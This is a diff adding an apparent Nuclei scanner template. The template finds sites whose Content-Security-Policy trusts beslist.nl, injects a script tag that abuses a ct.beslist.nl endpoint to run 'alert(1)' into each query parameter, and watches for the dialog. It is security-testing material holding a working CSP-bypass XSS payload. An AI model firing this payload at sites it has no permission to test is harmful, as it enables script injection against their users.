@@ -1,0 +1,55 @@
+id: beslist-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - beslist.nl
+  author: Jaenact
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,beslist-api
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "beslist.nl"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: beslist_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://ct.beslist.nl/ct_refresh?shopid=%22;%0a%0dalert(1);%20//%20"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "beslist_csp_xss == true"
+# digest: 4a0a00473045022100f102d223f65c11103845b5cc55eefc3e4cda8e456e0833105e54f198a6a3ca5f02203ff829be3a30c4b115933f700cadad8d3ebe235e9690a1be7cd140c7b8420b58:922c64590222798bb761d5b6d8e72950
